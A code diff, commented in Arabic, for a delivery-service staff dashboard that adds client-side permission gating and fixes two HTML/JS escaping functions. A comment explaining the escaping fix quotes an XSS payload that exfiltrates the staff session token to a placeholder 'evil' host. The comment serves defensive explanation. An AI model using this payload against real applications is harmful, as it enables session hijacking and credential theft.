@@ -31,7 +31,7 @@
        violates: script-src 'self' 'unsafe-inline' gstatic unpkg → **blocked**
 
      مكتبة firebase-database-compat تسقط إلى **long-polling** حين يتعذّر
-     WebSocket (وكيل · جدار حماية · تقلّب شبكة)، وتحقن حينها وسم <script>
+     WebSocket (وكيل · جدار حماية · تقلّب شبكة)، وتحقن حينها وسم &lt;script&gt;
      من نطاق قاعدة البيانات نفسها.
 
      وكان النطاق مسموحاً في connect-src وحده — فالاتصال مسموح والسكربت محجوب.
@@ -1072,7 +1072,8 @@ button,input,select,textarea{font-family:'Cairo',sans-serif;}
       </div>
       <div style="display:flex;gap:6px;margin-top:8px">
         <button class="cc-f" id="ccSortBtn" onclick="ccSetSort()" style="flex:0 0 auto">🕐 الأحدث أولاً</button>
-        <button class="bc-btn" onclick="bcOpen()" style="margin-top:0;flex:1">📣 بثّ موجّه</button>
+        <!-- 🎖️ [V29 ← نحلة] المُعرّف لازمٌ لإخفائه على من لا يملك «message» -->
+        <button class="bc-btn" id="bcOpenBtn" onclick="bcOpen()" style="margin-top:0;flex:1">📣 بثّ موجّه</button>
       </div>
     </div>
     <div class="cc-body" id="ccList"><div class="cc-empty">لا محادثات بعد.<br>حين يراسلك كابتن ستظهر هنا فوراً 💬</div></div>
@@ -1091,7 +1092,8 @@ button,input,select,textarea{font-family:'Cairo',sans-serif;}
           <div class="ct-qr-tabs" id="ctQrTabs"></div>
           <div class="ct-qr-list" id="ctQrList"></div>
         </div>
-        <div class="ct-bar">
+        <!-- 🎖️ [V29 ← نحلة] المُعرّف لازمٌ لإخفاء شريط الكتابة على من لا يملك «message» -->
+        <div class="ct-bar" id="ctBar">
           <textarea class="ct-in" id="ctInput" rows="1" placeholder="اكتب ردّك للكابتن..." oninput="ccDraftSave(this.value);this.style.height='auto';this.style.height=Math.min(this.scrollHeight,96)+'px'" onkeydown="ccKeydown(event)"></textarea>
           <button class="ct-send" id="ctSend" onclick="sendLeaderMsg()" title="إرسال (Enter)">➤</button>
         </div>
@@ -1183,6 +1185,28 @@ const MSG_TEMPLATES = [
 
 /* ════ STATE ════ */
 let STOKEN="",EMP_NAME="",EMP_PHONE="";
+/* ═══════════════════════════════════════════════════════════════════════════
+   🎖️ [V29 ← نحلة] «الليدر المميّز» — صلاحيات الموظف
+   ───────────────────────────────────────────────────────────────────────────
+   الإدارة تريد ليدراً يراقب ويراسل ولا يعيّن، وآخر يعيّن ويسحب ولا يحذف.
+   Code.gs يُعيد القائمة عبر STAFF_PERMS، وهذه اللوحة تُخفي ما لا يملكه.
+
+   🔓 والافتراض **مفتوح** لا مغلق: EMP_PERMS_ALL=true قبل وصول الردّ وبعد
+      فشله. لأن الوضع المغلق افتراضاً يعني أن انقطاع شبكةٍ لثوانٍ — أو عمود
+      شيتٍ لم يُملأ بعد — يُجرّد الليدر من كل أزراره في ذروة الخميس، فيقف
+      عاجزاً أمام طلبٍ بلا كابتن ولا يفهم لماذا. الحرمان الخاطئ أغلى من
+      العرض الزائد، لأن الخادم يرفض ما لا يُسمح به على أي حال.
+
+   🔒 وهذا **إخفاء واجهة لا أمن**: الحارس الحقيقي في Code.gs (فحص الصلاحية
+      عند تنفيذ الفعل). من فتح وحدة التحكّم وأعاد الزرّ يُردّ من الخادم.
+   ═══════════════════════════════════════════════════════════════════════════ */
+let EMP_PERMS=null, EMP_PERMS_ALL=true, _permsLoaded=false;
+/* الفحص الوحيد المعتمد — كل موضعٍ في اللوحة يمرّ من هنا، فلا يشذّ زرّ. */
+function canDo(p){
+  if(EMP_PERMS_ALL) return true;                 /* القديم/غير المقيَّد */
+  if(!Array.isArray(EMP_PERMS)) return true;     /* لم يصل ردّ ⇒ افتح */
+  return EMP_PERMS.indexOf(p) > -1;
+}
 let liveOrd=[],actDrv=new Set(),gDrivers=[],liveLed={drivers:{}};
 let drvLocs={},rfilt="all",pendCnt=0,fbConn=true,fbL=[];
 let radarHtml="";
@@ -1234,8 +1258,32 @@ function scheduleStaffTokenRefresh(phone,pass){
 }
 
 /* ════ UTILS ════ */
-function esc(s){if(s==null)return"";const d=document.createElement("div");d.textContent=String(s);return d.innerHTML;}
-function ej(s){return String(s??'').replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'&quot;');}
+/* ═══════════════════════════════════════════════════════════════════════
+   🔒 [V28] تصحيح دالتَي التهريب — كلتاهما كانت ناقصة، والنقصان متكاملان.
+
+   ① esc: كانت textContent→innerHTML، وهذا التسلسل يُهرّب & و < و >
+      **فقط**، ولا يُهرّب " ولا ' في عقدةٍ نصّية. وكانت تُستعمل داخل
+      قيم سمات (title="${esc(...)}" عند 3001) ⇒ محرف " واحد يُنهي
+      السمة ويفتح سمةً جديدة مثل onmouseover.
+      والمصدر ليس نظرياً: القواعد (rules:303) تسمح للكابتن بكتابة
+      driver_chats/$phone/driver_name **بنفسه**، فيكتب:
+        x" onmouseover="fetch('https://evil/?s='+sessionStorage.staff_session)
+      ⇒ يُنفَّذ بمجرّد مرور مؤشّر الليدر ⇒ سرقة التوكن وكلمة المرور.
+
+   ② ej: تُهرّب ' و " ولا تُهرّب & إطلاقاً. ومحلّل HTML يفكّ &#39;
+      إلى ' **قبل** أن يصل الدور إلى محلّل JS ⇒ خروجٌ من السلسلة
+      النصّية داخل onclick رغم التهريب الظاهر.
+      نظيرتها الصحيحة jss في restaurant.html:2572 تُهرّب & صراحةً —
+      وهي المعيار الذي لم تبلغه هذه.
+
+   القاعدة: esc لنصٍّ داخل عنصر أو قيمة سمة · ej لنصٍّ داخل سلسلة JS
+   داخل سمة (onclick="f('…')").
+   ═══════════════════════════════════════════════════════════════════════ */
+function esc(s){ if(s==null) return "";
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
+                  .replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
+function ej(s){ return String(s??'').replace(/&/g,'&amp;').replace(/\\/g,'\\\\')
+                                    .replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
 /* 🔧[خ٧] التطبيع الموحّد حرفياً مع GAS V16.0 و CF-6.0:
    أرقام عربية/فارسية → لاتينية، إسقاط 964، إسقاط كل الأصفار البادئة. */
 /* ⚡ [أداء] ذاكرة تطبيع الأرقام.
@@ -1410,6 +1458,52 @@ function enterApp(){
   document.getElementById("empName").textContent=EMP_NAME;
   showWelcomeMessage(EMP_NAME, EMP_PHONE);
   startClk();setupFB();startHofTimer();
+  loadStaffPerms();   /* 🎖️ [V29 ← نحلة] نداءٌ واحد لا يوقف الدخول */
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   🎖️ [V29 ← نحلة] جلب الصلاحيات — نداء واحد بعد الدخول
+   ───────────────────────────────────────────────────────────────────────────
+   ⚠️ لا await على مسار الدخول ولا شاشة انتظار: اللوحة تفتح كاملةً أوّلاً
+      ثم تُضيَّق إن لزم. لو انتظرنا الردّ وسقطت الشبكة عَلِقَ الليدر أمام
+      شاشةٍ فارغة — وهو أسوأ من عرض زرٍّ سيرفضه الخادم.
+   ⚠️ وكل مسارات الفشل تُبقي EMP_PERMS_ALL=true: استثناء الشبكة، success
+      كاذب، perms غير مصفوفة، أو الحقل غائب أصلاً (سيرفر قديم).
+   ═══════════════════════════════════════════════════════════════════════════ */
+async function loadStaffPerms(){
+  if(_permsLoaded)return;
+  try{
+    const d=await staffAction({action:"STAFF_PERMS"});
+    if(d&&d.success===true&&d.all!==true&&Array.isArray(d.perms)){
+      EMP_PERMS=d.perms.map(String); EMP_PERMS_ALL=false;
+    }else{
+      EMP_PERMS=null; EMP_PERMS_ALL=true;
+    }
+  }catch(e){
+    /* 🔓 الفشل يفتح لا يُغلق — انظر التعليق فوق EMP_PERMS. */
+    EMP_PERMS=null; EMP_PERMS_ALL=true;
+    console.warn("STAFF_PERMS:", e&&e.message);
+  }
+  _permsLoaded=true;
+  applyPermsToUi();
+}
+
+/* إخفاء الأزرار الثابتة في الـDOM. أمّا المبنيّة داخل القوائم فتُفحص عند
+   البناء بـcanDo — ولذلك نُبطل حُرّاس التجزئة ونُعيد الرسم هنا، وإلا
+   قارنت renderRadar/renderCrew نصّاً مطابقاً ولم تلمس الـDOM أصلاً. */
+function applyPermsToUi(){
+  const _tog=(id,on)=>{const e=document.getElementById(id);if(e)e.style.display=on?"":"none";};
+  const msg=canDo("message");
+  /* ⚠️ زرّ المراسلة لا يُعاد إلى "" بل إلى "flex" — تصميمه يعتمدها لتوسيط
+     الأيقونة والشارة، و"" يُرجعه إلى display:none المكتوب في السمة. */
+  const cf=document.getElementById("chatFab");
+  if(cf&&_ccStarted) cf.style.display=msg?"flex":"none";
+  else if(cf&&!msg)  cf.style.display="none";
+  _tog("bcOpenBtn", msg);        /* 📣 البثّ الموجّه */
+  _tog("ctBar", msg);            /* شريط كتابة الردّ */
+  _tog("ctQr",  msg);            /* الردود السريعة */
+  radarHtml="";_hofHtml="";_watchHtml="";_crewHtml="";
+  try{renderRadar();renderHallOfFame();renderWatchList();renderCrew();}catch(e){}
 }
 window.doLogout=async function(){
   if(!confirm("تأكيد تسجيل الخروج؟"))return;
@@ -1528,7 +1622,7 @@ function updateMap() {
                </div>
                <div style="display:flex; gap:6px;">
                   <button onclick="window.open('tel:${cleanP}')" style="flex:1; background:#eaf1fe; color:#1a5fd4; border:1px solid #c8dbfb; padding:8px 0; border-radius:10px; font-weight:800; cursor:pointer; font-family:'Cairo';">📞 اتصال</button>
-                  <button onclick="msgCaptain('${ej(cleanP)}','${ej(nameStr)}')" style="flex:1; background:#e7f9ef; color:#048a48; border:1px solid #b6ecca; padding:8px 0; border-radius:10px; font-weight:800; cursor:pointer; font-family:'Cairo';">💬 رسالة</button>
+                  ${/* 🎖️ [V29 ← نحلة] صلاحية «message» */''}${canDo("message")?`<button onclick="msgCaptain('${ej(cleanP)}','${ej(nameStr)}')" style="flex:1; background:#e7f9ef; color:#048a48; border:1px solid #b6ecca; padding:8px 0; border-radius:10px; font-weight:800; cursor:pointer; font-family:'Cairo';">💬 رسالة</button>`:''}
                </div>
             </div>`;
 
@@ -1705,6 +1799,9 @@ function attachDataListeners(){
     pendCnt=np;
     document.getElementById("vOrd").textContent=active.length;
     document.getElementById("vPend").textContent=np;
+    /* 🔔 [V29 ← نحلة] تنبيه الطلبات الجديدة — قبل جدولة الرسم لا بعده:
+       الرسم مؤجّل بمؤقّت، والتنبيه لا يحتمل تأخيراً. */
+    _alertNewOrders(active);
     updCnts();scheduleRadar();scheduleMap();scheduleHof();
   });
 
@@ -1780,7 +1877,8 @@ function renderHallOfFame(){
   if(!hasAny){
     html=`<div class="hof-empty" style="grid-column:1/-1">🌙 لم تُسجّل إنجازات اليوم بعد — تظهر لوحة الشرف تلقائياً مع أول طلب مُنجز.</div>`;
   }else{
-    const congBtn=(c)=>c&&c.phone?`<button class="hof-cong" onclick="congratsCaptain('${ej(c.phone)}','${ej(c.name)}')">🎉 تهنئة</button>`:"";
+    /* 🎖️ [V29 ← نحلة] التهنئة رسالةٌ في جوهرها ⇒ صلاحية «message». */
+    const congBtn=(c)=>(c&&c.phone&&canDo("message"))?`<button class="hof-cong" onclick="congratsCaptain('${ej(c.phone)}','${ej(c.name)}')">🎉 تهنئة</button>`:"";
 
     const card1=top1?`
       <div class="hof-card c1">
@@ -1852,7 +1950,7 @@ function renderWatchList(){
         </div>
         <div class="watch-acts">
           <button class="watch-b wb-call" onclick="window.open('tel:${ej(c.phone)}')" title="اتصال">📞</button>
-          <button class="watch-b wb-msg" onclick="checkInCaptain('${ej(c.phone)}','${ej(c.name)}')" title="اطمئن عليه">💬</button>
+          ${/* 🎖️ [V29 ← نحلة] صلاحية «message» */''}${canDo("message")?`<button class="watch-b wb-msg" onclick="checkInCaptain('${ej(c.phone)}','${ej(c.name)}')" title="اطمئن عليه">💬</button>`:''}
         </div>
       </div>`;
     });
@@ -1994,7 +2092,7 @@ function renderCrew(){
         <div class="crew-dur">⏱️ مدة العمل اليوم: ${fmtDur(c.workedMin)}</div>
         <div class="crew-acts">
           <button class="crew-b crew-b-call" onclick="window.open('tel:${ej(c.phone)}')">📞 اتصال</button>
-          <button class="crew-b crew-b-msg" onclick="msgCaptain('${ej(c.phone)}','${ej(c.name)}')">💬 رسالة</button>
+          ${/* 🎖️ [V29 ← نحلة] صلاحية «message» */''}${canDo("message")?`<button class="crew-b crew-b-msg" onclick="msgCaptain('${ej(c.phone)}','${ej(c.name)}')">💬 رسالة</button>`:''}
           ${trackBtn}
         </div>
       </div>`;
@@ -2033,7 +2131,23 @@ function startHofTimer(){
 /* ════════════════════════════════════════
    📨 الرسائل المباشرة داخل التطبيق (عبر الـ API)
 ════════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════════════════════
+   🎖️ [V29 ← نحلة] حارس الواجهة عند نقطة الفعل — لا عند الرسم وحده.
+   ───────────────────────────────────────────────────────────────────────────
+   إخفاء الزرّ لا يكفي: نافذة Leaflet المنبثقة تحمل HTML مُخزَّناً على
+   العلامة، وبطاقةٌ رُسمت قبل وصول الردّ تبقى في الـDOM حتى إعادة الرسم
+   التالية. فالفحص هنا يمنع فتح نافذةٍ لا يملك صاحبها إتمامها — ويشرح له
+   السبب بدل صمتٍ يبدو عطلاً.
+   🔒 وهو **رسالةٌ للمستخدم لا حاجز أمني**: الحاجز في Code.gs وحده.
+   ═══════════════════════════════════════════════════════════════════════════ */
+function needPerm(p,what){
+  if(canDo(p))return true;
+  toast("🚫 لا تملك صلاحية "+what+" — راجع الإدارة","e");
+  return false;
+}
+
 window.msgCaptain=function(phone,name,prefill){
+  if(!needPerm("message","المراسلة"))return;
   _msgPhone=nP(phone);_msgName=name||"—";
   document.getElementById("msgCapName").textContent=_msgName;
   document.getElementById("msgText").value=prefill||"";
@@ -2041,6 +2155,7 @@ window.msgCaptain=function(phone,name,prefill){
 };
 window.fillMsg=function(i){document.getElementById("msgText").value=MSG_TEMPLATES[i];};
 window.doSendMsg=async function(){
+  if(!needPerm("message","المراسلة"))return;
   const text=document.getElementById("msgText").value.trim();
   if(!text)return toast("اكتب رسالة أولاً","e");
   if(!_msgPhone)return toast("لا يوجد كابتن محدد","e");
@@ -2093,7 +2208,7 @@ window.openTimeline=function(oId){
   const meta=`<div class="tl-meta">
     <div class="tl-meta-c"><div class="tl-meta-v">${ageMin}</div><div class="tl-meta-l">دقيقة منذ الإنشاء</div></div>
     <div class="tl-meta-c"><div class="tl-meta-v">${sinceUpdate}</div><div class="tl-meta-l">دقيقة منذ آخر تحديث</div></div>
-    <div class="tl-meta-c"><div class="tl-meta-v" style="font-size:.95rem;color:#048a48">${o.price||0}</div><div class="tl-meta-l">قيمة الطلب (د.ع)</div></div>
+    <div class="tl-meta-c"><div class="tl-meta-v" style="font-size:.95rem;color:#048a48">${Number(o.price)||0}</div><div class="tl-meta-l">قيمة الطلب (د.ع)</div></div>
   </div>`;
 
   const ev=[];
@@ -2236,10 +2351,16 @@ function renderRadar(){
     const sovB=isSov?`<span class="stb stb-v" style="font-size:.6rem">👑</span>`:"";
 
     const trackBtn = hD ? `<button class="ob" style="width:auto;padding:0 8px;background:var(--blue-l);color:var(--blue-d);font-size:.68rem;font-weight:800;border:1px solid #c8dbfb;" onclick="trackDriver('${jDP}','${jRN}')">📍 مسار</button>` : '';
-    /* 💬 زر الرسالة المباشرة — يظهر فقط عند وجود كابتن مُعيّن */
-    const msgBtn = hD ? `<button class="ob b-msg" onclick="msgCaptain('${jDP}','${ej(dn)}')" title="رسالة مباشرة">💬</button>` : '';
-    /* ↩ زر السحب — يظهر الآن حتى للطلبات السيادية (بنص مميّز) */
-    const wdBtn = hD ? `<button class="ob b-del" style="width:auto;padding:0 8px;font-size:.68rem;font-weight:800;height:32px" onclick="wdOrder('${jOId}','${jDP}',this)">${isSov?'👑↩ سحب سيادي':'↩ سحب'}</button>` : '';
+    /* 💬 زر الرسالة المباشرة — يظهر فقط عند وجود كابتن مُعيّن
+       🎖️ [V29 ← نحلة] وبصلاحية «message» — الافتراض مفتوح (canDo). */
+    const msgBtn = (hD&&canDo("message")) ? `<button class="ob b-msg" onclick="msgCaptain('${jDP}','${ej(dn)}')" title="رسالة مباشرة">💬</button>` : '';
+    /* ↩ زر السحب — يظهر الآن حتى للطلبات السيادية (بنص مميّز)
+       🎖️ [V29 ← نحلة] وبصلاحية «withdraw». */
+    const wdBtn = (hD&&canDo("withdraw")) ? `<button class="ob b-del" style="width:auto;padding:0 8px;font-size:.68rem;font-weight:800;height:32px" onclick="wdOrder('${jOId}','${jDP}',this)">${isSov?'👑↩ سحب سيادي':'↩ سحب'}</button>` : '';
+    /* 🎖️ [V29 ← نحلة] الإكمال والإلغاء والتعيين — كلٌّ بصلاحيته. */
+    const okBtn  = canDo("complete") ? `<button class="ob b-ok" onclick="forceComplete('${jOId}',this)" title="إكمال">✓</button>` : '';
+    const delBtn = canDo("delete")   ? `<button class="ob b-del" onclick="delOrder('${jOId}',this)" title="إلغاء">✕</button>` : '';
+    const asgBtn = canDo("assign")   ? `<button class="asel" style="cursor:pointer;display:flex;align-items:center;justify-content:center;gap:5px" onclick="openAssign('${jOId}')">👑 تعيين كابتن</button>` : '';
 
     html+=`<div class="oc ${clsCls}">${delH}
       <div class="oc-head" style="${delH?"margin-top:24px":""}">
@@ -2254,12 +2375,12 @@ function renderRadar(){
           ${trackBtn}
           <button class="ob b-tl" onclick="openTimeline('${jOId}')" title="مسار الطلب الزمني">📜</button>
           ${jPU?`<button class="ob b-img" onclick="opImg('${jPU}')" title="صورة">🖼</button>`:''}
-          <button class="ob b-ok" onclick="forceComplete('${jOId}',this)" title="إكمال">✓</button>
-          <button class="ob b-del" onclick="delOrder('${jOId}',this)" title="إلغاء">✕</button>
+          ${okBtn}
+          ${delBtn}
         </div>
       </div>
       <div class="oc-body">
-        <div class="oc-row"><div class="oc-res">🍽 ${esc(rN)}</div><div class="oc-pr">${oP||0} د.ع</div></div>
+        <div class="oc-row"><div class="oc-res">🍽 ${esc(rN)}</div><div class="oc-pr">${Number(oP)||0} د.ع</div></div>
 
         <div class="oc-dr">
           <div class="oc-dn"><span>🛵 ${esc(dn)}</span></div>
@@ -2267,7 +2388,7 @@ function renderRadar(){
             ${hD?`<button class="cb-sm" onclick="window.open('tel:${jDP}')">📞</button>`:''}
             ${msgBtn}
             ${wdBtn}
-            <button class="asel" style="cursor:pointer;display:flex;align-items:center;justify-content:center;gap:5px" onclick="openAssign('${jOId}')">👑 تعيين كابتن</button>
+            ${asgBtn}
           </div>
         </div>
 
@@ -2288,6 +2409,7 @@ function renderRadar(){
    مع قيود الكتابة الجديدة. STAFF_DELETE في GAS V16.0 يحوّل الطلب إلى
    status='deleted' (لا حذف فعلي) فيبقى قابلاً للتدقيق. */
 window.forceComplete=async function(oId,el){
+  if(!needPerm("complete","إنهاء الطلبات"))return;
   if(!confirm("تأكيد إكمال الطلب؟"))return;
   if(el){el.disabled=true;el.classList.add("loading");}
   try{
@@ -2300,6 +2422,7 @@ window.forceComplete=async function(oId,el){
   finally{if(el){el.disabled=false;el.classList.remove("loading");}}
 };
 window.delOrder=async function(oId,el){
+  if(!needPerm("delete","حذف الطلبات"))return;
   if(!confirm("إلغاء الطلب؟"))return;
   if(el){el.disabled=true;el.classList.add("loading");}
   try{
@@ -2329,6 +2452,7 @@ window.asgnDrv=async function(oId,dPhone){
 let _assignOrderId="",_assignSearch="";
 
 window.openAssign=function(oId){
+  if(!needPerm("assign","تعيين الكباتن"))return;
   _assignOrderId=oId;
   _assignSearch="";
   document.getElementById("assignOrderId").textContent="#"+oId;
@@ -2403,6 +2527,7 @@ window.doAssign=async function(dPhone){
   await asgnDrv(_assignOrderId,dPhone);
 };
 window.wdOrder=async function(oId,dPhone,el){
+  if(!needPerm("withdraw","سحب الطلبات"))return;
   if(!confirm("سحب الطلب وإعادته للرادار؟"))return;
   if(el)el.disabled=true;
   try{
@@ -2538,14 +2663,36 @@ const QUICK_REPLIES=[
   ]}
 ];
 
-function _ccBeep(){try{const a=new (window.AudioContext||window.webkitAudioContext)();const o=a.createOscillator(),g=a.createGain();o.connect(g);g.connect(a.destination);o.frequency.value=880;g.gain.setValueAtTime(.12,a.currentTime);g.gain.exponentialRampToValueAtTime(.001,a.currentTime+.35);o.start();o.stop(a.currentTime+.35);}catch(e){}}
+/* 🔊 [V29 ← نحلة] سياق صوتي **واحد** لكل اللوحة.
+   كان _ccBeep يُنشئ AudioContext جديداً مع كل رسالة، والمتصفّحات تحدّ عددها
+   (ستّة في كروم) ولا تُحرَّر إلا بجمع القمامة ⇒ بعد عشرات الرسائل يتوقّف
+   الصوت نهائياً بلا خطأ ظاهر. وسياقٌ واحدٌ يُستأنف عند التعليق يحلّها،
+   ويلزم أصلاً لتنبيه الطلبات الجديدة أدناه. */
+let _audioCtx=null;
+function _AC(){
+  try{
+    if(!_audioCtx) _audioCtx=new (window.AudioContext||window.webkitAudioContext)();
+    /* المتصفّح يُعلّق السياق حين تُغادر التبويب — بلا استئناف يصمت التنبيه
+       في الحالة الوحيدة التي يُحتاج فيها فعلاً: اللوحة في الخلفية. */
+    if(_audioCtx.state==="suspended") _audioCtx.resume();
+  }catch(e){ return null; }
+  return _audioCtx;
+}
+function _ccBeep(){try{const a=_AC();if(!a)return;const o=a.createOscillator(),g=a.createGain();o.connect(g);g.connect(a.destination);o.frequency.value=880;g.gain.setValueAtTime(.12,a.currentTime);g.gain.exponentialRampToValueAtTime(.001,a.currentTime+.35);o.start();o.stop(a.currentTime+.35);}catch(e){}}
 
-/* إشعار سطح المكتب — يُطلب الإذن مرة واحدة عند أول محادثة واردة */
+/* إشعار سطح المكتب — يُطلب الإذن مرة واحدة عند أول محادثة واردة.
+   🔔 [V29 ← نحلة] وُسِّع بوسمٍ ودالة نقر: الوسم يمنع إشعار الطلب من دهس
+   إشعار المحادثة (وسمٌ واحد ⇒ يحلّ أحدهما محلّ الآخر)، والنقر يُعيد
+   التركيز ويُطفئ وميض العنوان. والوسيطان اختياريان — النداءات القائمة
+   تعمل كما هي بلا تعديل. */
 let _notifAsked=false;
-function _ccNotify(title,body){
+function _ccNotify(title,body,tag,onClick){
   try{
     if(!("Notification" in window))return;
-    if(Notification.permission==="granted"){new Notification(title,{body:body,tag:"hut-chat"});}
+    if(Notification.permission==="granted"){
+      const n=new Notification(title,{body:body,tag:tag||"hut-chat"});
+      if(onClick)n.onclick=onClick;
+    }
     else if(Notification.permission!=="denied"&&!_notifAsked){
       _notifAsked=true;                       /* مرة واحدة لا مع كل رسالة */
       Notification.requestPermission().catch(()=>{});
@@ -2571,7 +2718,9 @@ function _ccSlaChip(c){
 
 function startChatCenter(){
   if(_ccStarted)return;_ccStarted=true;
-  document.getElementById("chatFab").style.display="flex";
+  /* 🎖️ [V29 ← نحلة] لا نُظهر زرّ المراسلة لمن لا يملكها. وهو "flex" لا ""
+     لأن التصميم يعتمد flex في وسط الأيقونة والشارة. */
+  document.getElementById("chatFab").style.display=canDo("message")?"flex":"none";
   listen("driver_chats",snap=>{
     _ccChats=snap.val()||{};
     let totalUnread=0;
@@ -2699,7 +2848,7 @@ function renderChatList(){
       const ub=Number(c.unread_leader||0);
       const t=c.last_msg_at?fmtHM(c.last_msg_at):'';
       const on=_ccIsOnline(c.phone);
-      h+=`<div class="cc-conv" onclick="openThread('${esc(c.phone)}')">
+      h+=`<div class="cc-conv" onclick="openThread('${ej(c.phone)}')">
         <div class="cc-av" style="${on?'box-shadow:0 0 0 2.5px #86efac':''}">🛵</div>
         <div style="min-width:0">
           <div class="cc-nm">${esc(c.driver_name||'كابتن')}</div>
@@ -2841,10 +2990,11 @@ function renderCtx(){
         </div>
         ${o[O.AREA]&&o[O.AREA]!=='غير محدد'?`<div class="co-ar">📍 ${esc(o[O.AREA])}</div>`:''}
         <div class="co-acts">
-          <button class="co-b cust" ${cust?'':'disabled'} onclick="event.stopPropagation();ccDial('${esc(cust)}')">📞 الزبون</button>
-          <button class="co-b res"  ${resPh?'':'disabled'} onclick="event.stopPropagation();ccDial('${esc(resPh)}')">🍽 المطعم</button>
-          <button class="co-b wd"   onclick="event.stopPropagation();ccWithdraw('${esc(oid)}','${esc(p)}')">↩ سحب</button>
-          <button class="co-b fin"  onclick="event.stopPropagation();ccFinish('${esc(oid)}')">✔ إنهاء</button>
+          <button class="co-b cust" ${cust?'':'disabled'} onclick="event.stopPropagation();ccDial('${ej(cust)}')">📞 الزبون</button>
+          <button class="co-b res"  ${resPh?'':'disabled'} onclick="event.stopPropagation();ccDial('${ej(resPh)}')">🍽 المطعم</button>
+          ${/* 🎖️ [V29 ← نحلة] نفس صلاحيتَي الرادار — فلا يظهر هنا ما أُخفي هناك */''}
+          ${canDo("withdraw")?`<button class="co-b wd"   onclick="event.stopPropagation();ccWithdraw('${ej(oid)}','${ej(p)}')">↩ سحب</button>`:''}
+          ${canDo("complete")?`<button class="co-b fin"  onclick="event.stopPropagation();ccFinish('${ej(oid)}')">✔ إنهاء</button>`:''}
         </div>
       </div>`;
     });
@@ -2857,14 +3007,14 @@ function renderCtx(){
   h+=`<div class="ctx-more">
     <div class="ctx-hd">موقعه الآن</div>
     <div id="ctxMapWrap">
-      <button class="ctx-a" style="width:100%" onclick="ccShowMap('${esc(p)}')">🗺️ عرض موقعه على الخريطة</button>
+      <button class="ctx-a" style="width:100%" onclick="ccShowMap('${ej(p)}')">🗺️ عرض موقعه على الخريطة</button>
     </div>
     <div class="ctx-hd">إجراءات</div>
     <div class="ctx-acts">
-      <button class="ctx-a" onclick="ccCall('${esc(p)}')">📞 اتصال</button>
-      <button class="ctx-a" onclick="ccWhats('${esc(p)}')">💬 واتساب</button>
-      <button class="ctx-a" onclick="ccLocate('${esc(p)}')">📍 موقعه</button>
-      <button class="ctx-a" onclick="ccPush('${esc(p)}','${esc((c.driver_name||'كابتن').replace(/'/g,''))}')">🔔 إشعار</button>
+      <button class="ctx-a" onclick="ccCall('${ej(p)}')">📞 اتصال</button>
+      <button class="ctx-a" onclick="ccWhats('${ej(p)}')">💬 واتساب</button>
+      <button class="ctx-a" onclick="ccLocate('${ej(p)}')">📍 موقعه</button>
+      <button class="ctx-a" onclick="ccPush('${ej(p)}','${ej(c.driver_name||'كابتن')}')">🔔 إشعار</button>
     </div>
     <textarea class="ctx-note" id="ctxNote" rows="1" placeholder="ملاحظة داخلية عن هذه المحادثة (لا يراها الكابتن)..."
       oninput="ccNoteSave(this.value)">${esc(c.notes||'')}</textarea>
@@ -2898,6 +3048,7 @@ window.ccDial=function(p){
 };
 /* الإنهاء الإداري — يعيد استخدام مسار اللوحة نفسه (STAFF_COMPLETE عبر GAS) */
 window.ccFinish=function(oid){
+  if(!needPerm("complete","إنهاء الطلبات"))return;
   if(typeof window.forceComplete==='function')return window.forceComplete(oid,null);
   toast("تعذّر تنفيذ الإنهاء","e");
 };
@@ -2968,7 +3119,7 @@ window.ccPush=function(p,name){
   if(typeof window.msgCaptain==='function')return window.msgCaptain(p,name,'');
   const t=(document.getElementById("ctInput")||{}).value||"";
   if(!t.trim())return toast("اكتب النصّ في حقل الرسالة ثم اضغط الإشعار","e");
-  apiGet({action:"STAFF_MESSAGE",driverPhone:p,msg:t.trim()})
+  staffAction({action:"STAFF_MESSAGE",driverPhone:p,msg:t.trim()})
     .then(d=>{
       if(d&&d.success)toast("أُرسل الإشعار ✅");
       else toast((d&&d.msg)||"تعذّر الإرسال","e");
@@ -2976,9 +3127,10 @@ window.ccPush=function(p,name){
     .catch(()=>toast("تعذّر الإرسال","e"));
 };
 window.ccWithdraw=async function(oId,dPhone){
+  if(!needPerm("withdraw","سحب الطلبات"))return;
   if(!confirm("سحب هذا الطلب من الكابتن وإعادته للرادار؟"))return;
   try{
-    const d=await apiGet({action:"STAFF_WITHDRAW",orderId:oId,driverPhone:dPhone});
+    const d=await staffAction({action:"STAFF_WITHDRAW",orderId:oId,driverPhone:dPhone});
     toast(d&&d.success?"سُحب الطلب — عاد للرادار ✅":(d&&d.msg)||"فشل السحب",d&&d.success?"":"e");
   }catch(e){toast("تعذّر الاتصال","e");}
 };
@@ -3213,6 +3365,9 @@ function renderThread(force){
 function _ccSetComposer(enabled,hint){
   const inp=document.getElementById("ctInput"),btn=document.getElementById("ctSend"),qr=document.getElementById("ctQr");
   if(!inp||!btn)return;
+  /* 🎖️ [V29 ← نحلة] من لا يملك «message» يقرأ ولا يكتب. ويُطوى هنا لا في
+     applyPermsToUi وحدها، لأن هذه تُنادى مع كل فتح محادثة فتعيد ما أُخفي. */
+  if(!canDo("message")){ enabled=false; hint="مراقبة فقط — لا تملك صلاحية المراسلة"; }
   inp.disabled=!enabled;btn.disabled=!enabled;
   inp.placeholder=enabled?"اكتب ردّك للكابتن...":(hint||"مراقبة فقط");
   inp.style.opacity=enabled?"1":".6";
@@ -3242,6 +3397,7 @@ window.closeConversation=function(){
    الفقاعة تظهر فوراً باهتة، ثم تحلّ محلّها النسخة الحقيقية من فايربيس.
    إن فشل الإرسال تبقى مؤشَّرة بالأحمر مع زرّ إعادة — لا تختفي بصمت. */
 window.sendLeaderMsg=async function(){
+  if(!needPerm("message","المراسلة"))return;
   if(!_ccActive)return;
   const inp=document.getElementById("ctInput"),btn=document.getElementById("ctSend");
   const txt=(inp.value||'').trim();if(!txt)return;
@@ -3296,6 +3452,7 @@ const BC_MAX=60;
 let _bcTargets=[];
 
 window.bcOpen=function(){
+  if(!needPerm("message","المراسلة"))return;
   document.getElementById("bcModal").classList.add("open");
   _navPush("bc");
   document.getElementById("bcProg").textContent="";
@@ -3351,7 +3508,7 @@ window.bcSend=async function(){
   for(let i=0;i<picked.length;i++){
     prog.textContent=`جارٍ الإرسال… ${i+1} / ${picked.length}`;
     try{
